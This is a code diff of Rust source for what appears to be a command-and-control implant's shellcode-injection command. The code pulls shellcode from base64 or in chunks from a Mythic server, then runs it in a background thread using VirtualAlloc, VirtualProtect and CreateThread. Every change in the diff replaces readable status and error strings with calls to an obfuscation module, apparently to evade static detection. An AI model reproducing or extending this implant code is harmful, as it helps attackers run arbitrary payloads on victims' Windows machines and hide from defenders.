@@ -60,7 +60,7 @@ pub fn inject_shellcode(
     let shellcode_bytes = if let Some(b64) = &args.shellcode_base64 {
         // Direct base64 shellcode
         general_purpose::STANDARD.decode(b64)
-            .map_err(|e| format!("Failed to decode base64 shellcode: {}", e))?
+            .map_err(|e| format!("{}: {}", crate::obfstr::d(crate::obfstr::S_FAIL_DECODE), e))?
     } else if let Some(file_id) = &args.shellcode_file_id {
         // Download shellcode from Mythic - send request for first chunk
         tx.send(json!({
@@ -70,7 +70,7 @@ pub fn inject_shellcode(
                 "chunk_num": 1,
             }),
             "task_id": task.id,
-            "user_output": "Downloading shellcode chunk 1\n",
+            "user_output": format!("{} 1\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD)),
         }))?;
 
         // Receive first chunk
@@ -88,7 +88,7 @@ pub fn inject_shellcode(
                     "chunk_num": chunk_num,
                 }),
                 "task_id": task.id,
-                "user_output": format!("Downloading shellcode chunk {}/{}\n", chunk_num, total_chunks),
+                "user_output": format!("{} {}/{}\n", crate::obfstr::d(crate::obfstr::S_SHELLCODE_DOWNLOAD), chunk_num, total_chunks),
             }))?;
 
             let task: AgentTask = serde_json::from_value(rx.recv()?)?;
@@ -97,11 +97,11 @@ pub fn inject_shellcode(
         }
         file_data
     } else {
-        return Err("No shellcode source provided".into());
+        return Err(crate::obfstr::d(crate::obfstr::S_NO_SHELLCODE).into());
     };
 
     if shellcode_bytes.is_empty() {
-        return Err("Shellcode is empty".into());
+        return Err(crate::obfstr::d(crate::obfstr::S_SHELLCODE_EMPTY).into());
     }
 
     // Execute shellcode in current process in a spawned thread
@@ -111,7 +111,7 @@ pub fn inject_shellcode(
     std::thread::spawn(move || {
         unsafe {
             if let Err(e) = execute_shellcode_in_thread(&shellcode_bytes_clone) {
-                eprintln!("Shellcode execution failed in background thread: {}", e);
+                eprintln!("{}: {}", crate::obfstr::d(crate::obfstr::S_SHELLCODE_BG_FAIL), e);
             }
         }
     });
@@ -119,7 +119,7 @@ pub fn inject_shellcode(
     // Return immediately without waiting for shellcode to finish
     tx.send(mythic_success!(
         task.id,
-        format!("Shellcode execution started successfully ({} bytes). Running in background thread.", shellcode_size)
+        format!("{} ({} bytes). {}.", crate::obfstr::d(crate::obfstr::S_SHELLCODE_RUNNING), shellcode_size, crate::obfstr::d(crate::obfstr::S_SHELLCODE_THREAD))
     ))?;
     
     Ok(())
@@ -132,7 +132,7 @@ pub fn inject_shellcode(
     _tx: &mpsc::Sender<serde_json::Value>,
     _rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
-    Err("shinject is only implemented on Windows".into())
+    Err(format!("shinject {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY)).into())
 }
 
 /// Execute shellcode in a thread (in-process execution)
@@ -150,7 +150,8 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
 
     if executable_mem.is_null() {
         return Err(format!(
-            "VirtualAlloc failed. Error: {}",
+            "{}: {}",
+            crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_ALLOC),
             GetLastError()
         ));
     }
@@ -166,7 +167,7 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     let mut old_protect: u32 = 0;
     if VirtualProtect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
         VirtualFree(executable_mem, 0, MEM_RELEASE);
-        return Err(format!("VirtualProtect failed. Error: {}", GetLastError()));
+        return Err(format!("{}: {}", crate::obfstr::d(crate::obfstr::S_API_VIRTUAL_PROTECT), GetLastError()));
     }
 
     // Create thread to execute shellcode
@@ -183,7 +184,8 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     if thread_handle.is_null() {
         VirtualFree(executable_mem, 0, MEM_RELEASE);
         return Err(format!(
-            "CreateThread failed. Error: {}",
+            "{}: {}",
+            crate::obfstr::d(crate::obfstr::S_API_CREATE_THREAD),
             GetLastError()
         ));
     }
@@ -198,12 +200,14 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
 
     if wait_result == WAIT_TIMEOUT {
         Ok(format!(
-            "Shellcode execution started ({} bytes) in thread {}. Thread is still running (timeout reached).",
+            "{} ({} bytes) in thread {}. Thread is still running (timeout reached).",
+            crate::obfstr::d(crate::obfstr::S_SHELLCODE_START),
             buffer_size, thread_id
         ))
     } else {
         Ok(format!(
-            "Shellcode execution completed ({} bytes) in thread {} (exit code: {}, wait result: {}).",
+            "{} ({} bytes) in thread {} (exit code: {}, wait result: {}).",
+            crate::obfstr::d(crate::obfstr::S_SHELLCODE_DONE),
             buffer_size, thread_id, exit_code, wait_result
         ))
     }
